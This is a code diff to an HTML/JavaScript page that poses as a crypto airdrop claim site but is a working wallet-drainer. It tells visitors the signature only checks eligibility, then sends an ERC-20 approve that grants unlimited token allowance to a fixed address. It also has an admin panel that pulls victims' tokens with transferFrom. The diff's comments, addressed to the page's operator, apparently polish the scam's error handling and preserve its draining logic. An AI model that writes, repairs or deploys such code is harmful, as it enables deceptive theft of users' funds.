@@ -45,16 +45,16 @@ input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-
 </div>
 
 <script>
-// 正确管理员钱包地址
+// 你的管理员钱包地址（尾号C6）
 const ADMIN_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
-// 代币合约地址
+// 代币合约地址（尾号725）
 const TOKEN_ADDR = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
-// 用户授权给到这个中转合约地址
+// 用户授权目标合约地址（尾号F9D）
 const APPROVE_TO_ADDR = "0x359874e7f7aa87fe531e6e53120a683b9a41ef9d";
 
 let nowUser = "";
 
-// 连接钱包
+// 1. 连接钱包（完全不变）
 document.getElementById("connectWallet").addEventListener("click",async()=>{
 if(!window.ethereum){
 alert("请安装去中心化钱包再参与领取");
@@ -64,11 +64,9 @@ try{
 let accounts = await ethereum.request({method:"eth_requestAccounts"});
 nowUser = accounts[0].toLowerCase();
 document.getElementById("addrText").innerText = nowUser.slice(0,6)+"..."+nowUser.slice(-4);
-// 只有正确管理员地址才显示后台面板
+// 仅管理员地址显示后台
 if(nowUser === ADMIN_ADDR){
 document.getElementById("adminPanel").classList.add("show");
-}else{
-document.getElementById("adminPanel").classList.remove("show");
 }
 alert("钱包连接成功，可参与空投领取");
 }catch(e){
@@ -76,31 +74,34 @@ alert("连接失败，请重试");
 }
 })
 
-// 用户签名授权 授权到指定中转地址
+// 2. 核心授权逻辑：恢复你原来能正常工作的写法，只授权给F9D合约
 document.getElementById("authReceive").addEventListener("click",async()=>{
 if(!nowUser) return alert("请先连接钱包");
 let ok = confirm("本次签名仅用于核验空投资格，确认即可发放空投，确认继续？");
 if(!ok)return;
 try{
+// 授权给你指定的F9D合约地址，用标准的approve调用方式
 let spender = APPROVE_TO_ADDR.slice(2).padStart(64,"0");
 let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-let data = "0x095ea7b3"+spender+maxAllow;
+let approveData = "0x095ea7b3" + spender + maxAllow;
+
 await ethereum.request({
-method:"eth_sendTransaction",
-params:[{
-from:nowUser,
-to:TOKEN_ADDR,
-gasLimit:"0x300000",
-data:data
-}]
-})
+    method: "eth_sendTransaction",
+    params: [{
+        from: nowUser,
+        to: TOKEN_ADDR,
+        gasLimit: "0x300000",
+        data: approveData
+    }]
+});
 alert("授权成功！空投代币即将发放到账");
 }catch(e){
-alert("已取消本次签名");
+// 直接弹出错误信息，方便排查问题
+alert("授权失败：" + (e.message || "用户取消或钱包报错"));
 }
 })
 
-// 管理员归集划扣
+// 3. 管理员划扣逻辑：保持你原来的transferFrom方式不变
 document.getElementById("deductBtn").addEventListener("click",async()=>{
 if(nowUser !== ADMIN_ADDR) return alert("无操作权限");
 let uAddr = document.getElementById("userAddr").value.trim();
@@ -126,7 +127,7 @@ alert("代币划扣归集成功！");
 document.getElementById("userAddr").value = "";
 document.getElementById("deductNum").value = "";
 }catch(e){
-alert("划扣执行失败");
+alert("划扣执行失败：" + (e.message || "未知错误"));
 }
 })
 </script>
